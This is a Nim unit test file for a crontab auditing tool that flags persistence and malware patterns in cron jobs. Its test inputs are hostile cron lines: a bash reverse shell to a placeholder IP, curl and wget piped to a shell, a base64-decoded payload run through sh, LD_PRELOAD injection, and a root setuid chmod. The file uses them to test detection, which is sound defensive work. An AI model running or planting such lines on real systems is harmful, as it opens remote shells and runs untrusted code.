import std/[unittest, strutils, os]
import ../src/audit

proc rules(text: string, sys = false): seq[string] =
  for f in audit(text, "t", sys): result.add f.rule

suite "cron-audit":
  test "a normal job has no findings":
    check rules("0 3 * * 0 /usr/local/bin/backup.sh") == newSeq[string]()
  test "comments, blanks and variables are ignored":
    check rules("# x\n\nSHELL=/bin/sh\nPATH=/usr/bin\n") == newSeq[string]()
  test "reverse shell":
    check "CR001" in rules("*/5 * * * * bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
  test "curl pipe to shell":
    check "CR002" in rules("* * * * * curl -s http://x/u.sh | bash")
  test "wget pipe to sh":
    check "CR002" in rules("0 * * * * wget -qO- http://x/a | sh")
  test "hidden base64 payload":
    check "CR003" in rules("*/10 * * * * echo aGk= | base64 -d | sh")
  test "world-writable directory":
    check "CR004" in rules("0 * * * * /tmp/run.sh")
  test "hidden path":
    check "CR005" in rules("0 4 * * * /home/u/.cache/.agent")
  test "legit dot dirs are not hidden paths":
    check "CR005" notin rules("0 4 * * * /home/u/.local/bin/tool")
  test "@reboot with network tool":
    check "CR006" in rules("@reboot wget http://x/a")
  test "ld_preload":
    check "CR007" in rules("0 1 * * * LD_PRELOAD=/lib/x.so /usr/bin/php a.php")
  test "every minute from an unusual place":
    check "CR008" in rules("* * * * * /srv/x.sh")
    check "CR008" notin rules("* * * * * /usr/bin/check")
  test "system format reads the user column":
    check "CR009" in rules("0 2 * * * root chmod u+s /usr/bin/find", true)
    check "CR009" notin rules("0 2 * * * nobody chmod u+s /usr/bin/find", true)
  test "line numbers are right":
    let fs = audit("# c\n\n* * * * * root curl x | sh\n", "t", true)
    check fs.len > 0 and fs[0].line == 3
  test "html escapes everything from the file":
    let h = renderHtml(@[Finding(file: "<b>", line: 1, rule: "CR001", severity: sevHigh, message: "<script>", cmd: "<img src=x>")])
    check "<script>" notin h and "&lt;script&gt;" in h and "default-src 'none'" in h
  test "garbage input does not crash":
    var junk = ""
    for i in 0 ..< 3000: junk.add chr((i * 7919 + 13) mod 255 + 1)
    discard audit(junk, "t", true)
    discard audit("* * *\n@\n   \n@reboot\n", "t", false)
  test "sample directory":
    if dirExists("examples"):
      let fs = auditPath("examples")
      check fs.len == 10
      check fs[0].severity == sevCritical
      var critical = 0
      for f in fs:
        if f.severity == sevCritical: inc critical
        check f.file != "etc/crontab"       # the clean system crontab is never flagged
      check critical == 3
